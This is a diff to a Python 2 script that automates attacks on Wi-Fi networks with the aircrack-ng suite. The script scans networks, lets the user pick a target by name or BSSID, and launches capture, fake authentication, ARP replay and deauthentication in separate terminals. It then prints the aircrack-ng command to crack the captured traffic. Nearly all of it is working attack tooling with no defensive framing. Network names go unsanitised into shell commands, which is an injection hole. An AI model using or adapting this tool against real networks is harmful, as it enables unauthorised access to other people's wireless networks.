@@ -3,10 +3,10 @@
 import os
 import thread
 
-#After the handshake is caught run:
-####################################################
-#sudo aircrack-ng -w words.txt -b BSSID output*.cap#
-####################################################
+#After the 2nd window starts scrolling:
+#############################
+#sudo aircrack-ng output*.cap
+#############################
 
 #Maybe use this to force a handshake
 #aireplay-ng -0 #OFTIMES -a BSSID -c SOMEMACADDRESSCONNECTEDTOIT mon0
@@ -27,13 +27,19 @@ def getNetworks(device):
 
 def setNetworkInfo(networkList, target):
     for item in networkList:
+        global bssid
+        global channel
+        global essid
         if(item[2] == target):
-            global bssid
             bssid = item[0]
-            global channel
             channel = item[1]
-            global essid
             essid = item[2]
+            break
+        if(item[0] == target):
+            bssid = item[0]
+            channel = item[1]
+            essid = item[2]
+            break
             
 def setDeviceInfo(device):
     getDeviceInfoProcess = os.popen("ifconfig | grep " + device).read().split(' ')
@@ -47,11 +53,6 @@ def setDeviceInfo(device):
     mac = getDeviceInfoProcess[len(getDeviceInfoProcess) - 1]
     
 def printInfo():
-    global device
-    global mac
-    global bssid
-    global channel
-    global essid
     print "Device: " + device
     print "MAC: " + mac
     print "BSSID: " + bssid
@@ -71,20 +72,26 @@ def cleanUpFiles():
         os.system("sudo rm -f output*")
         os.system("sudo rm -f replay*")
 
-def printNetworks():
-    print "===================================="
-    networkList = getNetworks(device)
+def printNetworks(networkList):
+    print "========================================================================"
     for item in networkList:
-        print item[2]
-    print "===================================="
+        print item[0] + "\t" + item[2]
+    print "========================================================================"
     
 def authenticateWithWPA():
-    command = "sudo aireplay-ng -1 0 -e " + essid + " -a " + bssid + " -h " + mac +" mon0 --ignore-negative-one"
+    command = "sudo aireplay-ng -1 0 -a " + bssid + " -h " + mac +" mon0 --ignore-negative-one"
     os.system("gnome-terminal -e \"" + command + "\"")
 
 def replayARPRequest():
     command = "sudo aireplay-ng -3 -b " + bssid + " -h " + mac + " mon0 --ignore-negative-one"
     os.system("gnome-terminal -e \"" + command + "\"")
+
+#So terrible plz don't look at this. It does good things though.
+def displayDeauthCommand():
+    command = "sudo aireplay-ng -0 1 -a " + bssid + " -c MAC mon0 --ignore-negative-one"
+    os.system("gnome-terminal -e 'bash -c \"" + "echo " + command +
+                                                ";echo sudo aircrack-ng output*.cap" 
+                                                "; exec bash\"'")
 
 #Do this to keep the output clean for later on
 os.system("sudo echo What device to use?")
@@ -94,14 +101,15 @@ bssid = ''
 channel = ''
 essid = ''
 
+networkList = getNetworks(device)
 
-printNetworks()
+printNetworks(networkList)
+
 
 target = raw_input("Target ID?\n")
 if (target != "exit"):
     
     try:
-        networkList = getNetworks(device)
         setNetworkInfo(networkList, target)
         setDeviceInfo(device)
         
@@ -109,6 +117,7 @@ if (target != "exit"):
         thread.start_new_thread(capturePackets, ())
         thread.start_new_thread(authenticateWithWPA, ())
         thread.start_new_thread(replayARPRequest, ())
+        thread.start_new_thread(displayDeauthCommand, ())
         
         while 1:
             pass
